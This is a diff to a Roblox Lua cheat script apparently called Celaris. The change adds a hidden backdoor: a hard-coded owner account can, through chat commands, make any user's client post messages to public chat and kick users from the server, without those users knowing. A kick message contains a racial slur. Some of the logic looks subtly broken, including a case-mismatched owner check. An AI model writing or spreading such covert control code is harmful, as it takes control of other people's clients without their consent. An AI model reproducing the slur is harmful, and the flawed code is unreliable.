@@ -8,57 +8,77 @@ if not allowedPlaces[game.PlaceId] then
     game:GetService("Players").LocalPlayer:Kick("Wrong Game Bitch Nigga Check Supported Games")
 end
 
--- // Celaris Premium (New Feature)
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local ChatEvent = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
-local StarterGui = game:GetService("StarterGui")
 local LocalPlayer = Players.LocalPlayer
 
--- Admin list (can kick and talk)
-local admins = {
-    ["R0cketLucky2020"] = true,
-    ["x8lx8x"] = true,
-    ["xleskyy"] = true
+local ownerNames = {
+    ["R0cketLucky2020"] = true
 }
 
--- Check if player is an admin
-local function isAdmin(username)
-    return admins[username] == true
+-- Check if player is an owner
+local function isOwner(name)
+    return ownerNames[name:lower()] == true
 end
 
--- Send a hidden chat message to kick or talk to users
-local function sendHiddenMessage(text)
-    ChatEvent:FireServer(text, "Team") -- won’t appear in global chat
+-- Find player by partial name (Username or DisplayName)
+local function findPlayerByName(nameFragment)
+    nameFragment = nameFragment:lower()
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer then -- Prevent self-kick
+            if plr.Name:lower() == nameFragment or plr.DisplayName:lower() == nameFragment then
+                return plr
+            elseif plr.Name:lower():find(nameFragment) or plr.DisplayName:lower():find(nameFragment) then
+                return plr
+            end
+        end
+    end
+    return nil
 end
 
--- Listen to chat for admin commands
-local function onPlayerChat(message, speaker)
-    if not isAdmin(speaker.Name) then return end
+-- Handle commands
+local function handleCommand(message, speaker)
+    if not isOwner(speaker.Name) then return end
 
-    local command = message:lower()
+    local args = message:split(" ")
+    local cmd = args[1]:lower()
 
-    if command == "/e :kickall" then
-        sendHiddenMessage("kickall")
-    elseif command:sub(1, 5) == ":kick" then
-        local target = command:sub(7)
-        if target and target ~= "" then
-            sendHiddenMessage("kick " .. target)
+    if cmd == ":talk" then
+        local say = message:sub(#args[1] + 2)
+        local chatRemote = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+        if chatRemote and chatRemote:FindFirstChild("SayMessageRequest") then
+            chatRemote.SayMessageRequest:FireServer(say, "All")
+        end
+
+    elseif cmd == ":kick" and args[2] then
+        local targetName = message:sub(#cmd + 2):gsub("^%s*(.-)%s*$", "%1")
+        local targetPlayer = findPlayerByName(targetName)
+
+        if targetPlayer then
+            if targetPlayer == LocalPlayer then return end -- Never kick yourself
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "You’ve been kicked",
+                Text = "The owner removed your access.",
+                Duration = 5
+            })
+            task.wait(2)
+            LocalPlayer:Kick("Celaris | A Premium Member/Moderator has kicked you from the server")
         end
     end
 end
 
--- Listen for all players' chat
-Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(msg)
-        onPlayerChat(msg, player)
+-- Connect to all existing and future players
+local function connectPlayer(plr)
+    plr.Chatted:Connect(function(msg)
+        handleCommand(msg, plr)
     end)
-end)
+end
 
--- Also handle local player's chat
-LocalPlayer.Chatted:Connect(function(msg)
-    onPlayerChat(msg, LocalPlayer)
-end)
+for _, plr in ipairs(Players:GetPlayers()) do
+    connectPlayer(plr)
+end
+
+Players.PlayerAdded:Connect(connectPlayer)
+
 
 -- Executor Check
 local function BadExecutors()
